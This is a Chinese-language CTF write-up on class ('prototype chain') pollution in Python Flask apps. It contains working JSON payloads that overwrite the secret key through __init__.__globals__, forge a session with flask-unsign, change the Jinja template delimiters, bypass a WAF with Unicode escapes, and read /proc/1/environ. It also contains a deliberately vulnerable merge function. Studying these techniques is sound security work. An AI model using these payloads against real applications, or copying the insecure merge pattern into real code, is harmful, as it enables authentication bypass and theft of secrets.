原型链
在Pyton中每个对象都有一个原型，原型上定义了对象可以访问的属性和方法。当对象访问属性或方法时，会先在自身查找，如果找不到就会去原型链上的上级对象中查找，原型链污染攻击的思路是通过修改对象原型链中的属性，使得程序在访问属性或方法时得到不符合预期的结果。
原型链污染和JavaScript的原型链污染差不多，都是需要merge 函数来修改父类的属性。

## **flask的原型链污染**
一个注册接口，默认传递参数是form
```
 "username": "test"&"password": "test",
```
已知登录后默认的jwt中is_admin:0

我们可以传递一个json:
```
{
  "username":"test",
  "password":"test",
  "is_admin":1
}
```
直接变成管理员。


^
还可以利用原型连污染，覆盖掉全局变量中的jwt的SECRET_KEY的值
```
{
    "username": "test",
    "password": "test",
    "__init__": {"__globals__": {"app": {"config": {"SECRET_KEY": "123456"}}}}
}
```
这样就可以伪造flask的jwt。
```
flask-unsign --sign --cookie "{'is_admin': 1, 'username': 'test1'}" --secret  '123456'
 
eyJpc19hZG1pbiI6MSwidXNlcm5hbWUiOiJ0ZXN0MSJ9.ZzYYAg.hqQmeTq4GCo4yfAofb0pngi0tpA
```


^
## **jinja模板用的[# flag #]进行原型链污染**
污染 flask key 和 模板字符串的闭合规则。

因为是JSON，遇到waf还可以利用 JSON 解析 Unicode 来绕过 waf
```
app = Flask(__name__)
app.secret_key = generate_random_md5()

def merge(src, dst):
    # 可能造成原型链污染的函数
    for k, v in src.items():
        if hasattr(dst, '__getitem__'):
            if dst.get(k) and type(v) == dict:
                merge(v, dst.get(k))
            else:
                dst[k] = v
        elif hasattr(dst, k) and type(v) == dict:
            merge(v, getattr(dst, k))
        else:
            setattr(dst, k, v)

@app.route('/',methods=['POST'])
def index():
    username = request.form.get('username')
    password = request.form.get('password')
    session["username"] = username
    session["password"] = password
    if request.data:
        if filter(str(request.data)):
            return "NO POLLUTED!!!YOU NEED TO GO HOME TO SLEEP~"
        else:
            merge(json.loads(request.data), Evil)  #这里直接json.load可能造成原型链污染

@app.route('/admin',methods=['POST', 'GET'])
def templates():
    username = session.get("username", None)
    password = session.get("password", None)
    if username and password:
        if username == "adminer" and password == app.secret_key:
            return render_template("flag.html", flag=open("/flag", "rt").read())
        else:
            return "Unauthorized"
    else:
        return f'Hello,  This is the POLLUTED page.'

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)


flag.html内容：
<body>
    这又是什么jinja语法啊！
    [#flag#]
</body>
```

这里要求password 等于全局变量app.secret_key后，可以通过flag.html带出flag。
flag.html里jinja模板用的[# flag #]，不是默认的{{ ... }}，不会渲染变量，这里需要加个jinja_env指定模板的闭合符号为[# #]让其可以像{{}}一样可以渲染。
```
{"__init__":
	{"__globals__":
		{"app":
			{
				"secret_key":"123456",
				"jinja_env":{
					"variable_start_string":"[#",
					"variable_end_string":"#]"
				}
			}
		}
	}
}
```
遇到waf，是json，直接unicode编码绕过
```
{"\u005f\u005f\u0069\u006e\u0069\u0074\u005f\u005f":
	{"\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f":
		{"\u0061\u0070\u0070":
			{
				"secret\u005fkey":"123456",
				"jinja\u005f\u0065\u006e\u0076":{
					"variable\u005fstart\u005f\u0073\u0074\u0072\u0069\u006e\u0067":"[#",
					"variable\u005fend\u005f\u0073\u0074\u0072\u0069\u006e\u0067":"#]"
				}
			}
		}
	}
}
```
此时继续根目录传递
```
username=adminer & password=123456
```



^
## **其他题payload**
```
data = {
	"username" : "admin", 
	"password" : "123456", # 在data中定义username和password保证data可以进入merge函数中
	"\u005F\u005F\u0069\u006E\u0069\u0074\u005F\u005F": { # 在check中可以看到有black_list,__init__被过滤了，使用unioncode进行绕过
		"__globals__" : {
			"__file__": "../../../proc/1/environ" # 大部分的flag都隐藏在环境变量中
		}
	}
}
```